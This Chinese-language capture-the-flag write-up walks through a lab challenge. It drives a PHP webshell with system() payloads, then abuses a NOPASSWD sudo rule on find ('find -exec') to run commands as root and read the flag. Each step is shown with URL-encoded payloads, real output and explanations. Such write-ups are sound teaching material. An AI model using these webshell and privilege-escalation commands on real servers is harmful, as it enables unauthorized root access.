# 关于**EZPrivEsc**的题

## **EZPrivEsc1**（suid提权）

第一题题目有提示，可以先从题目中找找有用的信息。

**index.php 是一个 POST 一句话木马，密码是 `qc`。你需要将用户权限从 `www-data` 提升至 `root`，读取 `/root/flag.txt` 中的 flag。**

可以大概知道，需要在 index.php 的地址下，进行一个 POST 的传参，且他的参数为 qc ，然后找到一个可以执行 root 权限的用户进行一个 flag 的读取，大体的思路确定了，然后打开容器后发现什么信息都没有提示，直接开始传参。这里我使用的是 hackbar 在浏览器进行的解法，当然使用 bp 也是可以的，还有用 liunx 的系统命令行也可以。只要做出来题的方法都是好办法喵！

首先，虽然他说了要木马传参，但是我们还是可以测试一手：

```
qc=phpinfo();  记得要URL编码，我这里展示明文更容易理解;
```

发现进入了容器的参数页面，但是全局搜索没有找到 flag。但是可以确定存在木马。

```
qc=echo'nihao';   URL ->echo%27nihao%27%3b
```

输入这个参数后，发现界面回显了`nihao`，证明了我们的思路可行。

接着找一下现在的权限是什么？确认一下当前的用户。

```
qc=system('id');   URL ->system%28%27id%27%29%3B
```

页面回显：

`uid=33(www-data) gid=33(www-data) groups=33(www-data)` 

找到了当前的用户，但是并不能确定其是否有权限去找 flag。

接下来枚举一手有`sudo`权限：

```
qc=system('sudo -n -l');   URL：system(%27sudo+-n+-l%27)%3b
```

页面回显：
`Matching Defaults entries for www-data on 878a3cd0b1b5: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty User www-data may run the following commands on 878a3cd0b1b5: (ALL) NOPASSWD: /usr/bin/find`

通过该回显可知：说明 `www-data` 可以免密 sudo 执行 `/usr/bin/find`。

那么先验证能通过 `find -exec` 提到 ****：

```
qc=system('sudo -n /usr/bin/find / -maxdepth 0 -exec id \\;');   URL:system(%27sudo+-n+%2fusr%2fbin%2ffind+%2f+-maxdepth+0+-exec+id+%5c%5c%3b%27)%3b
```

回显：

`uid=0(root) gid=0(root) groups=0(root)`

接下来，通过  root 的权限去找一个 flag 到底在哪个目录下：

```
qc=system('sudo -n /usr/bin/find / -maxdepth 3 -type f -iname "*flag*" -exec ls -l {} \; 2>/dev/null');
URL:system(%27sudo+-n+%2fusr%2fbin%2ffind+%2f+-maxdepth+3+-type+f+-iname+%22*flag*%22+-exec+ls+-l+%7b%7d+%5c%3b+2%3e%2fdev%2fnull%27)%3b
```

回显：

`-r-------- 1 root root 0 Nov 6 11:24 /proc/kpageflags -rwxr-xr-x 1 root root 8334 Jun 30 2025 /usr/bin/dpkg-buildflags -rw------- 1 root root 42 Jan 1 1970 /flag -rwxr-xr-x 1 root root 504 Sep 9 07:25 /flag-entrypoint.sh`

发现 flag 就在 /flag 的文件下。

然后直接指定 flag 去看其内容。

```
qc=system('sudo -n /usr/bin/find / -maxdepth 1 -type f -name "flag" -exec cat {} \; 2>/dev/null');
URL：system('sudo%20-n%20%2Fusr%2Fbin%2Ffind%20%2F%20-maxdepth%201%20-type%20f%20-name%20%22flag%22%20-exec%20cat%20%7B%7D%20%5C%3B%202%3E%2Fdev%2Fnull')%3B
```

然后直接回显 flag 。

```
flag{9edcebab-48e8-49b0-99d5-ffd3def622af}
```

附示：提供一些参数的含义。

`sudo -n /usr/bin/find`

- `sudo`：以超级管理员（root）权限运行后面的命令。
- `-n`：**非交互模式 (non-interactive)**。意思是“如果遇到需要输入密码的情况，直接报错退出，不要卡在这里等”。因为我们在网页里没法输入密码，这个参数很关键。
- `/usr/bin/find`：我们之前通过 `sudo -l` 看到，`www-data` 用户有权限免密以 root 身份运行这个文件。**注意：这里写绝对路径更稳妥，防止环境变量被篡改。**

/ -maxdepth 0`

- `/`：告诉 `find` 从根目录开始找。
- `-maxdepth 0`：**这是整条命令的灵魂所在！**
  - `-maxdepth` 是规定搜索深度的。如果是 `1`，代表只找当前目录下的文件；如果是 `2`，就是找当前目录及其子目录。
  - **设置为 `0` 意味着：只匹配起点本身（也就是 `/` 目录），不再往下找任何子目录或文件。**
  - **为什么要这么做？** 如果在真实的服务器上直接运行 `sudo find /`，它会遍历整个硬盘（可能包含几十万个文件），服务器会瞬间卡死（CPU 100%），甚至导致宕机。加上 `-maxdepth 0`，它瞬间就能匹配到 `/` 这个目录，速度极快，几乎不消耗资源。

-exec id \;

- `-exec`：`find` 命令的参数，意思是“对前面找到的结果执行后面的命令”。
  - 因为前面找到的是 `/`（根目录），所以这里的意思就是用 root 权限对 `/` 执行 `id` 命令。
- `id`：你想真正执行的命令（查看当前用户身份）。
- `\;`：**这是一个语法规定。** 在 Linux 终端里，分号 `;` 是用来分隔命令的。为了让 `find` 知道 `-exec` 后面的命令到哪里结束，必须用反斜杠 `\` 对分号进行转义（`\;`），表示这是一个普通的字符，而不是命令分隔符。

`2>&1`

- 这是一个标准的 Linux 重定向语法。
- `2` 代表“标准错误输出”（报错信息）。
- `1` 代表“标准输出”（正常的打印信息）。
- `2>&1` 的意思是：**把报错信息也当做正常信息输出出来。**
- **为什么需要这个？** 因为在网页的 PHP `system()` 函数中，默认只能抓取到正常的输出内容，如果命令报错了（比如权限不够、语法不对），错误信息会被丢弃，网页上什么都不显示，你就会一脸懵逼。加上这个，无论成功还是失败，网页上都能看到回显，方便排错。

- **`qc=system('...');`**
  - 这是你在调用 PHP 的 `system()` 函数执行里面的 Linux 命令。
- **`sudo -n /usr/bin/find`**
  - 利用我们之前发现的 `sudo` 漏洞，以 `root` 权限运行 `find` 命令。因为 flag 文件通常只有 root 能看，不用 sudo 根本搜不到。
- **`/`**
  - 搜索的起点：从 Linux 的根目录开始找。
- **`-maxdepth 3`**
  - **限定搜索深度。**
  - 意思是最多只往下找 3 层目录（比如 `/root/flag.txt` 是 2 层，`/var/www/html/flag.php` 是 3 层）。
  - *为什么要限制？* 如果不加这个，`find` 会遍历整个服务器（包括 `/proc`、`/sys` 等系统目录），极大概率会导致服务器卡死或者超时，网页直接报错。
- **`-type f`**
  - **限定文件类型。**
  - `f` 代表 `file`（普通文件）。这排除了目录（directory）、链接文件等，只找真正的文件。
- **`-iname "\*flag\*"`**
  - **按名字模糊匹配。**
  - `-iname` 是 `-name` 的升级版，**忽略大小写**（这样 `Flag.txt`、`FLAG`、`myflag.php` 都能被搜到）。
  - `"*flag*"` 里的星号是通配符，代表名字中**只要包含** `flag` 这个词就行，不管它前面或后面还有什么字符。
- **`-exec ls -l {} \;`**
  - **对搜到的文件执行操作。**
  - 每搜到一个符合条件的文件，就执行一次 `ls -l`（列出文件的详细属性：权限、大小、所有者、修改时间等）。
  - `{}` 是一个占位符，代表 `find` 刚刚搜到的那个文件的路径。
  - `\;` 是 `find` 命令的固定语法，代表 `-exec` 命令的结束。
- **`2>/dev/null`**
  - **丢弃报错信息。**
  - 在 Linux 里，数字 `2` 代表“标准错误输出”。`/dev/null` 是一个“黑洞”设备。
  - 这个构造的意思是：把查找过程中产生的所有报错（比如“权限不够”、“找不到文件”等）全部扔进黑洞，不要在网页上显示。
  - *为什么加这个？* 因为全盘搜索会产生大量没有权限访问的目录报错，页面会很乱。我们只想看搜到的真实结果。
